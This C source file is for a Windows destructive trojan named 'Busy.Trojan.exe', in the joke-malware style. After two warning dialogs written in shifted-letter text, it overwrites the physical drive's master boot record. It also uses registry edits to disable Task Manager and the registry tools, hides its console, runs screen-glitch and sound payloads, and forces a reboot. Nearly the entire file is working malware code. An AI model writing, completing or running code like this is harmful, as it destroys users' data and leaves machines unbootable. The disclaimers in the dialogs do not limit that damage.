#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4715)
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include"def.h"
#include"glitch.h"
#include"sound.h"
#include"payload.h"
#include"mbr.h" 
void clean(){
	for(int i=0;i<30;i++){
		InvalidateRect(0,0,0);
	}
}
HRESULT DwmEnableComposition(UINT uCompositionAction){
	typedef HRESULT(WINAPI *_dwmEnableComposition)(UINT uCompositionAction);
	HMODULE hm=LoadLibrary(_T("dwmapi.dll"));
	if(hm==NULL) return -1;
	_dwmEnableComposition dwmfunc=(_dwmEnableComposition)GetProcAddress(hm,"DwmEnableComposition");
	return dwmfunc(uCompositionAction);
}

BOOL AlreadyStartGlitch = false;
BOOL CALLBACK EnumProc114(HWND hWnd, LPARAM lParam) {
	SetWindowTextA(hWnd, "You are so dead.");
	ShowWindow(hWnd, 0);
	EnableWindow(hWnd, FALSE);
	return 1;
}

DWORD WINAPI msgglitch(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(hDlg);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmpi = { 0 };
		bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmpi.bmiHeader.biWidth = MessageBoxWidth;
		bmpi.bmiHeader.biHeight = MessageBoxHeight;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;
		PRGBQUAD rgbScreen = { 0 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < MessageBoxWidth * MessageBoxHeight; i++) {
			INT x = i % MessageBoxWidth, y = i / MessageBoxWidth;
			rgbScreen[i].rgb *= 5;
		}
		BitBlt(hdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}
}

LRESULT CALLBACK CBTProc2(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		if (AlreadyStartGlitch == true) {
			return 114514;
		}
		AlreadyStartGlitch = true;
		hDlg = (HWND)wParam;
		RECT rect;
		GetWindowRect(hDlg, &rect);
		MessageBoxWidth = rect.right - rect.left;
		MessageBoxHeight = rect.bottom - rect.top;
		//EnumChildWindows(hDlg, EnumProc114, 0);
		glitchmsgbox1 = CreateThread(0, 0, (PTHREAD_START_ROUTINE)msgglitch, 0, 0, 0);
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}

void RunPayload(){	
	HANDLE Overwrite = CreateThread(0, 0, mbr, 0, 0, 0);
	HANDLE D = CreateThread(0, 0, Disable, 0, 0, 0);
	Sleep(5000);
	HANDLE msg=CreateThread(NULL,0,msgbox,NULL,0,NULL);
	DwmEnableComposition(0);

	HANDLE sh1=CreateThread(NULL,0,shader1,NULL,0,NULL);
	sound1();
	Sleep(30000);
	TerminateThread(sh1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh2=CreateThread(NULL,0,shader2,NULL,0,NULL);
	sound2();
	Sleep(30000);
	TerminateThread(sh2,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh3=CreateThread(NULL,0,shader3,NULL,0,NULL);
	sound3();
	Sleep(30000);
	TerminateThread(sh3,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh4=CreateThread(NULL,0,shader4,NULL,0,NULL);
	HANDLE sh4dot1=CreateThread(NULL,0,shader4dot1,NULL,0,NULL);
	sound4();
	Sleep(30000);
	TerminateThread(sh4,0);
	TerminateThread(sh4dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh5=CreateThread(NULL,0,shader5,NULL,0,NULL);
	sound5();
	Sleep(30000);
	TerminateThread(sh5,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh6=CreateThread(NULL,0,shader6,NULL,0,NULL);
	HANDLE sh6dot1=CreateThread(NULL,0,shader6dot1,NULL,0,NULL);
	sound6();
	Sleep(30000);
	TerminateThread(sh6,0);
	//TerminateThread(sh6dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh7=CreateThread(NULL,0,shader7,NULL,0,NULL);
	sound7();
	Sleep(30000);
	TerminateThread(sh7,0);
	TerminateThread(sh6dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh8=CreateThread(NULL,0,shader8,NULL,0,NULL);
	HANDLE sh8dot1=CreateThread(NULL,0,mama,NULL,0,NULL);
	sound8();
	Sleep(30000);
	TerminateThread(sh8,0);
	//TerminateThread(sh8dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh9=CreateThread(NULL,0,shader9,NULL,0,NULL);
	sound9();
	Sleep(30000);
	TerminateThread(sh9,0);
	TerminateThread(sh8dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh10=CreateThread(NULL,0,shader10,NULL,0,NULL);
	HANDLE sh10dot1=CreateThread(NULL,0,shader6dot1,NULL,0,NULL);
	sound10();
	Sleep(30000);
	TerminateThread(sh10,0);
	TerminateThread(sh10dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	HANDLE sh11=CreateThread(NULL,0,shader11,NULL,0,NULL);
	HANDLE sh11dot1=CreateThread(NULL,0,mama,NULL,0,NULL);
	sound11();
	Sleep(30000);
	TerminateThread(sh11,0);
	TerminateThread(sh11dot1,0);
	InvalidateRect(0,0,0);
	Sleep(100);
	system("shutdown.exe /r /t 00");
  ExitProcess(0);
}
int main(){
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	//HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, &CBTProc3, 0, GetCurrentThreadId());
	if(MessageBoxW(NULL,L"DHYUPUN!\n\nFvb ohcl yhu h Ayvqhu ruvdu hz Busy.Trojan.exe aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt.\n\nIf jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa pz opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz.\n\nHyl fvb zbyl fvb dhua av ybu aopz????", L"Busy.Trojan.exe -- WARNING", MB_YESNO|MB_ICONWARNING|MB_DEFBUTTON2|MB_RTLREADING)==IDYES){
			//UnhookWindowsHookEx(hMsgHook);
		HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, CBTProc2, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"MPUHS DHYUPUN!!!\n\nAopz Ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl, huk aol jylhavy dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz..\n\nHyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu.", L"Busy.Trojan.exe -- WARNING", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDYES){
			UnhookWindowsHookEx(hMsgHook);
			RunPayload();
		}
	}
	return 0;
}